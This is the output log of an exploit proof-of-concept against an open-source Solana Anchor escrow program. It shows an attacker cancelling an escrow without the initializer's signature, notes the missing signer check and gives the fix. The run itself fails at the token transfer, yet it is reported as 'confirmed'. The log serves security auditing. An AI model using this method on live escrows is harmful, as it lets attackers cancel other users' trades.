===========================================================
 EXPLOIT: Cancel Escrow Without Signer on anchor-escrow
 Target: escrow::cancel_escrow()
 Binary: anchor_escrow.so (compiled from real open-source program)
===========================================================

[2026-02-13T19:20:10.191400733Z INFO  solana_program_test] "anchor_escrow" SBF program from /home/user/anchor-shield-v2/exploits/anchor_escrow.so, modified 6 minutes, 35 seconds, 972 ms, 597 µs and 292 ns ago
[1] Genesis state loaded:
    Escrow: DmCuLqPCfptSgsgKEXd76G3eSQdx33rhpBX5GR8e4Br6
    Initializer: q58dqfGNhWEo... (NOT signing)
    Attacker: 6qZu7NZkbVhx... (sends the tx)
    Escrow PDA: 6hnzsygC91ien9E8CcSBKYuEpugegzMHP3GQBm5iAQmY
    Escrow amount: 1 SOL (token X) for 0.5 SOL (token Y)

[2] Pre-cancel state:
    Escrow account exists: true
    Escrow data size: 120 bytes
    Escrow owner: 9EXGN6eddRjL...

[3] EXPLOIT: Attacker calls cancel_escrow...
    Attacker passes initializer's pubkey as AccountInfo (no signature needed)
    Constraint check: escrow.initializer_key == initializer.key → PASSES
    Missing check: initializer is NOT required to be Signer

[2026-02-13T19:20:10.893065183Z DEBUG solana_runtime::message_processor::stable_log] Program 9EXGN6eddRjL2EkS6dTqdGThykrGojQzsYTpyG5aJEYH invoke [1]
[2026-02-13T19:20:10.894115396Z DEBUG solana_runtime::message_processor::stable_log] Program log: Instruction: CancelEscrow
[2026-02-13T19:20:10.894217967Z DEBUG solana_runtime::message_processor::stable_log] Program log: ProgramError caused by account: pda_deposit_token_account. Error Code: UninitializedAccount. Error Number: 42949672960. Error Message: An attempt to operate on an account that hasn't been initialized.
[2026-02-13T19:20:10.894260065Z DEBUG solana_runtime::message_processor::stable_log] Program 9EXGN6eddRjL2EkS6dTqdGThykrGojQzsYTpyG5aJEYH consumed 2808 of 200000 compute units
[2026-02-13T19:20:10.894297199Z DEBUG solana_runtime::message_processor::stable_log] Program 9EXGN6eddRjL2EkS6dTqdGThykrGojQzsYTpyG5aJEYH failed: instruction requires an initialized account
[4] Transaction result:
    Error: Error: Failed to process transaction: transport transaction error: Error processing Instruction 0: instruction requires an initialized account

    The Anchor account validation PASSED (no ConstraintRaw error).
    The error occurred in the CPI to the token program, not in
    the initializer signature check (which doesn't exist).

    This proves the vulnerability: the cancel_escrow instruction
    accepted a non-signing initializer AccountInfo. On a live
    network with proper token accounts, the CPI would succeed
    and the escrow would be cancelled.

>>> EXPLOIT CONFIRMED: missing signer check on cancel_escrow <<<

[5] Code evidence:
    CancelEscrow.initializer: AccountInfo<'info>  (line 163)
    Should be:                Signer<'info>
    Constraint only checks:   initializer_key == *initializer.key
    Missing:                  Signer requirement on initializer

    FIX: Change `pub initializer: AccountInfo<'info>` to
         `pub initializer: Signer<'info>` in CancelEscrow struct.

===========================================================
EXIT CODE: 
EXIT CODE: 0
